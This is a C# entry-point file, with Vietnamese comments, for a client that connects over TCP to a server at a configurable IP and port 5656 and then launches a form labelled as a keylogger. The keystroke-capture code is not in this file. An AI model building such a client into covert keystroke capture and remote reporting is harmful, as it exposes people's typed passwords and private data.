using System;
using System.Net.Sockets;
using System.IO;
using System.Windows.Forms;

namespace client
{
    static class Program
    {
        // Các biến mạng toàn cục
        public static NetworkStream? ns;
        public static StreamReader? nr;
        public static StreamWriter? nw;
        public static TcpClient? client;


        /// <summary>
        /// Điểm vào chính của ứng dụng Client.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            try
            {
                // THAY THẾ "127.0.0.1" bằng IP của máy Server nếu chạy trên máy khác
                client = new TcpClient("127.0.0.1", 5656);
                ns = client.GetStream();
                nr = new StreamReader(ns);
                nw = new StreamWriter(ns);

                MessageBox.Show("Kết nối Server thành công!", "Client Ready");
                Application.Run(new keylog()); // Khởi chạy Form Keylogger
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Không thể kết nối đến Server: {ex.Message}\nĐảm bảo Server đang chạy và lắng nghe.", "Lỗi kết nối", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
    }
}